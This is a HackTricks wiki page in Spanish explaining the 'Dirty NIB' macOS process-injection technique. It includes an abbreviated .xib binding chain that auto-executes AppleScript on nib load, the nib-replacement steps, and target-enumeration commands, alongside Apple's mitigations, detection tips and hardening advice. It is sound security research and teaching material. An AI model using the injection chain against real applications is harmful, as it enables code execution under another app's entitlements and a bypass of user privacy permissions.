# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB se refiere al abuso de archivos de Interface Builder (`.xib`/`.nib`) dentro del bundle de una app de macOS firmada para ejecutar lógica controlada por el atacante dentro del proceso objetivo, heredando así sus entitlements y permisos de TCC. Esta técnica fue documentada originalmente por xpn (MDSec) y posteriormente generalizada y ampliada significativamente por Sector7, que también cubrió las mitigaciones de Apple en macOS 13 Ventura y macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Para conocer los antecedentes y análisis detallados, consulta las referencias al final.

> TL;DR
> • Antes de macOS 13 Ventura: reemplazar el MainMenu.nib de un bundle (u otro nib cargado durante el inicio) podía lograr de forma fiable la inyección de procesos y, a menudo, la escalada de privilegios.
> • Desde macOS 13 (Ventura), y con mejoras en macOS 14 (Sonoma): la verificación profunda durante el primer lanzamiento, la protección de bundles, Launch Constraints y el nuevo permiso de TCC “App Management” impiden en gran medida la manipulación de nibs después del lanzamiento por parte de apps no relacionadas. Los ataques aún pueden ser viables en casos específicos (por ejemplo, herramientas del mismo desarrollador que modifican sus propias apps, o terminales a las que el usuario haya concedido App Management/Full Disk Access).


## Qué son los archivos NIB/XIB

Los archivos Nib (abreviatura de NeXT Interface Builder) son grafos de objetos de UI serializados utilizados por apps de AppKit. Las versiones modernas de Xcode almacenan archivos XML `.xib` editables, que se compilan en `.nib` durante el proceso de build. Una app típica carga su UI principal mediante `NSApplicationMain()`, que lee la clave `NSMainNibFile` del `Info.plist` de la app e instancia el grafo de objetos durante el runtime.

Puntos clave que permiten el ataque:
- La carga de NIB instancia clases arbitrarias de Objective-C sin requerir que cumplan con NSSecureCoding (el loader de nib de Apple recurre a `init`/`initWithFrame:` cuando `initWithCoder:` no está disponible).
- Cocoa Bindings puede abusarse para llamar a métodos mientras se instancian los nibs, incluidas llamadas encadenadas que no requieren interacción del usuario.


## Proceso de inyección de Dirty NIB (perspectiva del atacante)

El flujo clásico anterior a Ventura:
1) Crear un `.xib` malicioso
- Añadir un objeto `NSAppleScript` (u otras clases “gadget”, como `NSTask`).
- Añadir un `NSTextField` cuyo título contenga el payload (por ejemplo, AppleScript o argumentos de comandos).
- Añadir uno o más objetos `NSMenuItem` conectados mediante bindings para llamar a métodos en el objeto objetivo.

2) Activar automáticamente sin clics del usuario
- Usar bindings para establecer el target/selector de un elemento de menú y, a continuación, invocar el método privado `_corePerformAction` para que la acción se ejecute automáticamente cuando se cargue el nib. Esto elimina la necesidad de que el usuario haga clic en un botón.

Ejemplo mínimo de una cadena de activación automática dentro de un `.xib` (abreviado para facilitar la comprensión):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Esto permite la ejecución arbitraria de AppleScript en el proceso objetivo al cargar el nib.<sup>[[1]](#references)</sup> Las cadenas avanzadas pueden:
- Instanciar clases arbitrarias de AppKit (p. ej., `NSTask`) y llamar a métodos sin argumentos como `-launch`.
- Llamar a selectores arbitrarios con argumentos de tipo objeto mediante el binding trick anterior.
- Cargar AppleScriptObjC.framework para establecer un puente hacia Objective-C e incluso llamar a determinadas APIs de C.
- En sistemas antiguos que aún incluyen Python.framework, establecer un puente hacia Python y usar después `ctypes` para llamar a funciones C arbitrarias (investigación de Sector7).<sup>[[2]](#references)</sup>

3) Reemplazar el nib de la aplicación
- Copia target.app a una ubicación con permisos de escritura, reemplaza, por ejemplo, `Contents/Resources/MainMenu.nib` por el nib malicioso y ejecuta target.app. Antes de Ventura, tras una evaluación única de Gatekeeper, los lanzamientos posteriores solo realizaban comprobaciones superficiales de la firma, por lo que los recursos no ejecutables (como `.nib`) no se volvían a validar.

Ejemplo de payload de AppleScript para una prueba visible:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Protecciones modernas de macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple introdujo varias mitigaciones sistémicas que reducen drásticamente la viabilidad de Dirty NIB en las versiones modernas de macOS:<sup>[[2]](#references)</sup>
- Verificación profunda durante el primer lanzamiento y protección del bundle (macOS 13 Ventura)
- En la primera ejecución de cualquier app (en cuarentena o no), una comprobación profunda de la firma cubre todos los recursos del bundle. Después, el bundle queda protegido: solo las apps del mismo developer (o permitidas explícitamente por la app) pueden modificar su contenido. Otras apps necesitan el nuevo permiso de TCC “App Management” para escribir en el bundle de otra app.
- Launch Constraints (macOS 13 Ventura)
- Las apps del sistema o incluidas por Apple no se pueden copiar a otra ubicación y ejecutar; esto elimina el enfoque de “copiar a /tmp, parchear y ejecutar” para las apps del sistema operativo.
- Mejoras en macOS 14 Sonoma
- Apple reforzó App Management y corrigió bypasses conocidos (por ejemplo, CVE‑2023‑40450) señalados por Sector7. Python.framework se eliminó anteriormente (macOS 12.3), rompiendo algunas cadenas de privilege-escalation.
- Cambios en Gatekeeper/Quarantine
- Para una discusión más amplia sobre Gatekeeper, provenance y los cambios de assessment que afectaron a esta técnica, consulta la página referenciada a continuación.

> Implicación práctica
> • En Ventura+ generalmente no puedes modificar el archivo .nib de una app de terceros a menos que tu proceso tenga App Management o esté firmado con el mismo Team ID que el objetivo (por ejemplo, developer tooling).
> • Conceder App Management o Full Disk Access a shells/terminales vuelve a abrir efectivamente esta superficie de ataque para cualquier proceso que pueda ejecutar código dentro del contexto de ese terminal.


### Abordar Launch Constraints

Launch Constraints impide ejecutar muchas apps de Apple desde ubicaciones no predeterminadas a partir de Ventura. Si dependías de workflows anteriores a Ventura, como copiar una app de Apple a un directorio temporal, modificar `MainMenu.nib` y ejecutarla, espera que falle en >= 13.0.


## Enumerar objetivos y nibs (útil para investigación / sistemas legacy)

- Localizar apps cuya interfaz de usuario está basada en nibs:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Encuentra recursos nib candidatos dentro de un bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valida profundamente las firmas de código (fallará si manipulaste los recursos y no volviste a firmar):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: En macOS moderno también estarás bloqueado por la protección del bundle/TCC al intentar escribir en el bundle de otra app sin la autorización adecuada.


## Consejos de detección y DFIR

- Monitorización de la integridad de archivos en los recursos del bundle
- Vigila los cambios de mtime/ctime en `Contents/Resources/*.nib` y otros recursos no ejecutables de las apps instaladas.
- Unified logs y comportamiento de los procesos
- Monitoriza la ejecución inesperada de AppleScript dentro de apps GUI y los procesos que carguen AppleScriptObjC o Python.framework. Ejemplo:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Evaluaciones proactivas
- Ejecuta periódicamente `codesign --verify --deep` en las apps críticas para garantizar que los recursos permanezcan intactos.
- Contexto de privilegios
- Audita quién o qué tiene TCC “App Management” o Full Disk Access (especialmente terminales y agentes de gestión). Eliminar estos permisos de los shells de propósito general evita volver a habilitar trivialmente la manipulación al estilo Dirty NIB.


## Hardening defensivo (desarrolladores y defensores)

- Prefiere una UI programática o limita lo que se instancia desde nibs. Evita incluir clases potentes (por ejemplo, `NSTask`) en los grafos de nibs y evita bindings que invoquen indirectamente selectores sobre objetos arbitrarios.
- Adopta el hardened runtime con Library Validation (ya es estándar en las apps modernas). Aunque esto no detiene por sí solo la inyección de nibs, bloquea la carga sencilla de código nativo y obliga a los atacantes a utilizar payloads únicamente de scripting.
- No solicites ni dependas de permisos amplios de App Management en herramientas de propósito general. Si MDM requiere App Management, separa ese contexto de los shells controlados por el usuario.
- Verifica periódicamente la integridad del bundle de tu app y haz que tus mecanismos de actualización reparen automáticamente los recursos del bundle.


## Lecturas relacionadas en HackTricks

Obtén más información sobre Gatekeeper, quarantine y los cambios de provenance que afectan a esta técnica:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referencias

- [1] [xpn – DirtyNIB (write-up original con el ejemplo de Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 de abril de 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
